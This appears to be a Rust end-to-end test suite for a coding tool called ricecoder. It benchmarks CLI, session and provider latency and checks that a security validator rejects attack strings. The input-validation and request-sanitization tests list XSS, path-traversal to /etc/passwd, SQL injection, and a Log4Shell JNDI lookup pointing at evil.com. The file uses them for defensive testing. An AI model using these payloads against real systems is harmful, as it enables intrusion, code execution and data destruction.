//! End-to-End Test Suite: Performance Testing, Security Validation, and Regression Detection
//!
//! This test suite validates system performance under load, security validation across
//! all components, and regression detection to ensure system stability and security.

use ricecoder_cli::commands::*;
use ricecoder_performance::{PerformanceMonitor, BenchmarkRunner};
use ricecoder_security::{SecurityValidator, VulnerabilityScanner};
use ricecoder_sessions::SessionManager;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tempfile::TempDir;
use tokio::test;
use tokio::time::timeout;

/// Complete performance and security validation workflow
#[tokio::test]
async fn test_performance_security_regression_workflow() {
    let temp_dir = TempDir::new().expect("Failed to create temp directory");

    // Initialize performance monitoring
    let performance_monitor = Arc::new(PerformanceMonitor::new().await
        .expect("Failed to create performance monitor"));

    // Initialize security validation
    let security_validator = Arc::new(SecurityValidator::new().await
        .expect("Failed to create security validator"));

    // Run baseline performance tests
    run_baseline_performance_tests(&performance_monitor).await;

    // Run security validation tests
    run_security_validation_tests(&security_validator).await;

    // Run regression detection tests
    run_regression_detection_tests(&performance_monitor, &security_validator).await;

    // Generate comprehensive report
    generate_validation_report(&performance_monitor, &security_validator).await;

    temp_dir.close().expect("Failed to cleanup");
}

/// Run baseline performance tests
async fn run_baseline_performance_tests(performance_monitor: &Arc<PerformanceMonitor>) {
    performance_monitor.start_monitoring().await
        .expect("Failed to start performance monitoring");

    // Test CLI command performance
    let cli_performance = test_cli_command_performance().await;
    performance_monitor.record_metric("cli_command_latency", cli_performance.as_millis() as f64).await;

    // Test session management performance
    let session_performance = test_session_management_performance().await;
    performance_monitor.record_metric("session_operation_latency", session_performance.as_millis() as f64).await;

    // Test provider switching performance
    let provider_performance = test_provider_switching_performance().await;
    performance_monitor.record_metric("provider_switch_latency", provider_performance.as_millis() as f64).await;

    // Test concurrent operations performance
    let concurrent_performance = test_concurrent_operations_performance().await;
    performance_monitor.record_metric("concurrent_ops_throughput", concurrent_performance).await;

    performance_monitor.stop_monitoring().await
        .expect("Failed to stop performance monitoring");
}

/// Test CLI command execution performance
async fn test_cli_command_performance() -> Duration {
    let start_time = Instant::now();

    // Execute multiple CLI commands
    for i in 0..10 {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let path = temp_dir.path().to_string_lossy().to_string();

        let init_cmd = InitCommand::new(Some(path));
        let _result = init_cmd.execute();
        // Ignore result for performance testing

        temp_dir.close().expect("Failed to cleanup");
    }

    start_time.elapsed() / 10 // Average per command
}

/// Test session management performance
async fn test_session_management_performance() -> Duration {
    let session_manager = SessionManager::new(Default::default()).await
        .expect("Failed to create session manager");

    let start_time = Instant::now();

    // Create and manipulate multiple sessions
    for i in 0..10 {
        let session_name = format!("perf-test-session-{}", i);
        let session_id = session_manager.create_session(&session_name).await
            .expect("Failed to create session");

        session_manager.set_active_session(&session_id).await
            .expect("Failed to set active session");

        session_manager.add_message_to_session(&session_id, "Performance test message").await
            .expect("Failed to add message");
    }

    start_time.elapsed() / 10 // Average per session operation
}

/// Test provider switching performance
async fn test_provider_switching_performance() -> Duration {
    let provider_manager = ricecoder_providers::ProviderManager::new().await
        .expect("Failed to create provider manager");

    // Configure test providers
    let config1 = ricecoder_providers::ProviderConfig {
        provider_type: ricecoder_providers::ProviderType::OpenAI,
        api_key: Some("test-key-1".to_string()),
        ..Default::default()
    };
    let config2 = ricecoder_providers::ProviderConfig {
        provider_type: ricecoder_providers::ProviderType::Anthropic,
        api_key: Some("test-key-2".to_string()),
        ..Default::default()
    };

    provider_manager.add_provider("perf-openai", config1).await
        .expect("Failed to add provider");
    provider_manager.add_provider("perf-anthropic", config2).await
        .expect("Failed to add provider");

    let start_time = Instant::now();

    // Switch between providers multiple times
    for _ in 0..20 {
        provider_manager.set_active_provider("perf-openai").await
            .expect("Failed to switch provider");
        provider_manager.set_active_provider("perf-anthropic").await
            .expect("Failed to switch provider");
    }

    start_time.elapsed() / 40 // Average per switch
}

/// Test concurrent operations performance
async fn test_concurrent_operations_performance() -> f64 {
    let start_time = Instant::now();
    let mut handles = vec![];

    // Spawn concurrent operations
    for i in 0..20 {
        let handle = tokio::spawn(async move {
            // Simulate some work
            let session_manager = SessionManager::new(Default::default()).await
                .expect("Failed to create session manager");

            let session_name = format!("concurrent-test-{}", i);
            let session_id = session_manager.create_session(&session_name).await
                .expect("Failed to create session");

            session_manager.add_message_to_session(&session_id, "Concurrent message").await
                .expect("Failed to add message");

            true
        });
        handles.push(handle);
    }

    // Wait for all operations to complete
    for handle in handles {
        handle.await.expect("Concurrent operation failed");
    }

    let total_time = start_time.elapsed();
    20.0 / total_time.as_secs_f64() // Operations per second
}

/// Run comprehensive security validation tests
async fn run_security_validation_tests(security_validator: &Arc<SecurityValidator>) {
    security_validator.start_validation().await
        .expect("Failed to start security validation");

    // Test input validation security
    test_input_validation_security(security_validator).await;

    // Test authentication and authorization
    test_auth_security(security_validator).await;

    // Test data encryption and protection
    test_encryption_security(security_validator).await;

    // Test API security
    test_api_security(security_validator).await;

    // Test session security
    test_session_security(security_validator).await;

    security_validator.stop_validation().await
        .expect("Failed to stop security validation");
}

/// Test input validation security
async fn test_input_validation_security(security_validator: &Arc<SecurityValidator>) {
    let malicious_inputs = vec![
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "'; DROP TABLE users; --",
        "${jndi:ldap://evil.com/a}",
        "<iframe src='javascript:alert(1)'></iframe>",
    ];

    for input in malicious_inputs {
        let validation_result = security_validator.validate_input(input).await;
        assert!(!validation_result.is_safe, "Malicious input should be flagged as unsafe: {}", input);

        security_validator.record_validation_attempt(input, validation_result.is_safe).await;
    }

    // Test safe inputs
    let safe_inputs = vec![
        "Hello world",
        "user@example.com",
        "SELECT * FROM users WHERE id = 1",
        "function calculateTotal() { return 42; }",
    ];

    for input in safe_inputs {
        let validation_result = security_validator.validate_input(input).await;
        assert!(validation_result.is_safe, "Safe input should pass validation: {}", input);
    }
}

/// Test authentication and authorization security
async fn test_auth_security(security_validator: &Arc<SecurityValidator>) {
    // Test authentication attempts
    let auth_attempts = vec![
        ("valid_user", "correct_password", true),
        ("valid_user", "wrong_password", false),
        ("invalid_user", "any_password", false),
        ("", "", false),
        ("admin", "admin", false), // Common weak credentials
    ];

    for (username, password, should_succeed) in auth_attempts {
        let auth_result = security_validator.validate_authentication(username, password).await;
        assert_eq!(auth_result.success, should_succeed,
            "Auth validation failed for user: {}, expected: {}", username, should_succeed);
    }

    // Test authorization checks
    let authz_checks = vec![
        ("user", "read_own_data", true),
        ("user", "read_all_data", false),
        ("admin", "read_all_data", true),
        ("admin", "delete_system", false),
    ];

    for (user, permission, should_allow) in authz_checks {
        let authz_result = security_validator.validate_authorization(user, permission).await;
        assert_eq!(authz_result.allowed, should_allow,
            "Authz validation failed for user: {}, permission: {}", user, permission);
    }
}

/// Test data encryption and protection
async fn test_encryption_security(security_validator: &Arc<SecurityValidator>) {
    let sensitive_data = "This is sensitive information";

    // Test encryption
    let encrypted = security_validator.encrypt_data(sensitive_data).await
        .expect("Failed to encrypt data");
    assert_ne!(encrypted, sensitive_data, "Encrypted data should differ from plaintext");

    // Test decryption
    let decrypted = security_validator.decrypt_data(&encrypted).await
        .expect("Failed to decrypt data");
    assert_eq!(decrypted, sensitive_data, "Decrypted data should match original");

    // Test key rotation
    security_validator.rotate_encryption_keys().await
        .expect("Failed to rotate keys");

    // Verify data can still be decrypted with new keys
    let still_decrypted = security_validator.decrypt_data(&encrypted).await
        .expect("Failed to decrypt with rotated keys");
    assert_eq!(still_decrypted, sensitive_data, "Should decrypt with rotated keys");
}

/// Test API security validation
async fn test_api_security(security_validator: &Arc<SecurityValidator>) {
    // Test API key validation
    let api_keys = vec![
        ("sk-valid-key-1234567890abcdef", true),
        ("invalid-key", false),
        ("", false),
        ("sk-123", false), // Too short
    ];

    for (api_key, should_be_valid) in api_keys {
        let key_result = security_validator.validate_api_key(api_key).await;
        assert_eq!(key_result.is_valid, should_be_valid,
            "API key validation failed for: {}", api_key);
    }

    // Test rate limiting
    for i in 0..15 {
        let rate_limit_result = security_validator.check_rate_limit("test_user", "api_call").await;
        if i >= 10 { // Assume 10 requests per minute limit
            assert!(!rate_limit_result.allowed,
                "Should be rate limited after threshold, request: {}", i);
        }
    }

    // Test request sanitization
    let malicious_requests = vec![
        r#"{"query": "<script>evil()</script>"}"#,
        r#"{"data": "../../../etc/passwd"}"#,
        r#"{"sql": "'; DROP TABLE users; --"}"#,
    ];

    for request in malicious_requests {
        let sanitized = security_validator.sanitize_request(request).await;
        assert!(!sanitized.contains("<script>"), "Script tags should be sanitized");
        assert!(!sanitized.contains("../../../"), "Path traversal should be sanitized");
        assert!(!sanitized.contains("DROP TABLE"), "SQL injection should be sanitized");
    }
}

/// Test session security validation
async fn test_session_security(security_validator: &Arc<SecurityValidator>) {
    let session_manager = SessionManager::new(Default::default()).await
        .expect("Failed to create session manager");

    // Create test session
    let session_id = session_manager.create_session("security-test").await
        .expect("Failed to create session");

    // Test session integrity
    let integrity_result = security_validator.validate_session_integrity(&session_id).await;
    assert!(integrity_result.is_valid, "Session should be valid");

    // Test session data protection
    session_manager.add_message_to_session(&session_id, "Sensitive data").await
        .expect("Failed to add message");

    let protection_result = security_validator.validate_session_data_protection(&session_id).await;
    assert!(protection_result.is_encrypted, "Session data should be encrypted");

    // Test session expiration
    security_validator.set_session_timeout(&session_id, Duration::from_secs(1)).await;

    tokio::time::sleep(Duration::from_secs(2)).await;

    let expired_result = security_validator.validate_session_integrity(&session_id).await;
    assert!(!expired_result.is_valid, "Session should be expired");
}

/// Run regression detection tests
async fn run_regression_detection_tests(
    performance_monitor: &Arc<PerformanceMonitor>,
    security_validator: &Arc<SecurityValidator>
) {
    // Load baseline metrics (would be loaded from previous test runs)
    let baseline_metrics = HashMap::from([
        ("cli_command_latency".to_string(), 100.0), // ms
        ("session_operation_latency".to_string(), 50.0), // ms
        ("provider_switch_latency".to_string(), 25.0), // ms
    ]);

    // Compare current metrics against baseline
    let current_metrics = performance_monitor.get_current_metrics().await
        .expect("Failed to get current metrics");

    for (metric_name, baseline_value) in baseline_metrics {
        if let Some(current_value) = current_metrics.get(&metric_name) {
            let regression_threshold = 1.5; // 50% degradation allowed
            let max_allowed = baseline_value * regression_threshold;

            assert!(current_value <= &max_allowed,
                "Performance regression detected in {}: current {:.2}ms > baseline {:.2}ms * {:.1}",
                metric_name, current_value, baseline_value, regression_threshold);
        }
    }

    // Check for security regressions
    let security_baseline = security_validator.get_security_baseline().await
        .expect("Failed to get security baseline");

    let current_security = security_validator.get_current_security_status().await
        .expect("Failed to get current security status");

    // Ensure no new vulnerabilities
    assert!(current_security.vulnerability_count <= security_baseline.vulnerability_count,
        "Security regression: new vulnerabilities detected");

    // Ensure no degradation in security score
    assert!(current_security.security_score >= security_baseline.security_score * 0.95,
        "Security regression: security score degraded too much");
}

/// Generate comprehensive validation report
async fn generate_validation_report(
    performance_monitor: &Arc<PerformanceMonitor>,
    security_validator: &Arc<SecurityValidator>
) {
    let mut report = String::new();
    report.push_str("# E2E Validation Report\n\n");

    // Performance section
    report.push_str("## Performance Metrics\n\n");
    let metrics = performance_monitor.get_current_metrics().await
        .expect("Failed to get metrics");

    for (metric, value) in metrics {
        report.push_str(&format!("- {}: {:.2}\n", metric, value));
    }

    // Security section
    report.push_str("\n## Security Status\n\n");
    let security_status = security_validator.get_current_security_status().await
        .expect("Failed to get security status");

    report.push_str(&format!("- Security Score: {:.2}%\n", security_status.security_score));
    report.push_str(&format!("- Vulnerabilities: {}\n", security_status.vulnerability_count));
    report.push_str(&format!("- Compliance Violations: {}\n", security_status.compliance_violations));

    // Recommendations
    report.push_str("\n## Recommendations\n\n");

    if security_status.vulnerability_count > 0 {
        report.push_str("- Address outstanding security vulnerabilities\n");
    }

    for (metric, value) in metrics {
        if metric.contains("latency") && value > 1000.0 {
            report.push_str(&format!("- Investigate high latency in {}\n", metric));
        }
    }

    // Save report (in real implementation)
    println!("{}", report);
}

/// Test system stability under load
#[tokio::test]
async fn test_system_stability_under_load() {
    let performance_monitor = Arc::new(PerformanceMonitor::new().await
        .expect("Failed to create performance monitor"));

    performance_monitor.start_monitoring().await
        .expect("Failed to start monitoring");

    // Simulate sustained load
    let load_test_duration = Duration::from_secs(30);
    let start_time = Instant::now();

    let mut operation_count = 0;

    while start_time.elapsed() < load_test_duration {
        // Perform various operations concurrently
        let mut handles = vec![];

        for _ in 0..5 {
            let perf_monitor = performance_monitor.clone();
            let handle = tokio::spawn(async move {
                // Simulate some work
                tokio::time::sleep(Duration::from_millis(10)).await;
                perf_monitor.record_metric("load_test_operation", 1.0).await;
            });
            handles.push(handle);
        }

        for handle in handles {
            handle.await.expect("Load test operation failed");
        }

        operation_count += 5;

        // Small delay to prevent overwhelming the system
        tokio::time::sleep(Duration::from_millis(50)).await;
    }

    performance_monitor.stop_monitoring().await
        .expect("Failed to stop monitoring");

    // Validate system remained stable
    let final_metrics = performance_monitor.get_current_metrics().await
        .expect("Failed to get final metrics");

    // System should have handled the load without crashing
    assert!(operation_count > 100, "Should have completed sufficient operations");

    // Memory usage should be reasonable (basic check)
    if let Some(memory_usage) = final_metrics.get("memory_mb") {
        assert!(memory_usage < &1000.0, "Memory usage should be reasonable");
    }
}

/// Test graceful degradation under extreme conditions
#[tokio::test]
async fn test_graceful_degradation() {
    let performance_monitor = Arc::new(PerformanceMonitor::new().await
        .expect("Failed to create performance monitor"));

    let security_validator = Arc::new(SecurityValidator::new().await
        .expect("Failed to create security validator"));

    // Simulate resource exhaustion
    performance_monitor.simulate_resource_exhaustion().await;

    // System should continue to function with reduced capabilities
    let degraded_performance = test_cli_command_performance().await;

    // Performance may be worse but should not crash
    assert!(degraded_performance < Duration::from_secs(30),
        "System should still function under resource exhaustion");

    // Security should still be maintained
    let security_status = security_validator.get_current_security_status().await
        .expect("Failed to get security status");

    assert!(security_status.security_score > 50.0,
        "Security should be maintained even under degradation");

    // Test recovery
    performance_monitor.restore_normal_resources().await;

    let recovered_performance = test_cli_command_performance().await;
    assert!(recovered_performance < degraded_performance,
        "Performance should improve after resource restoration");
}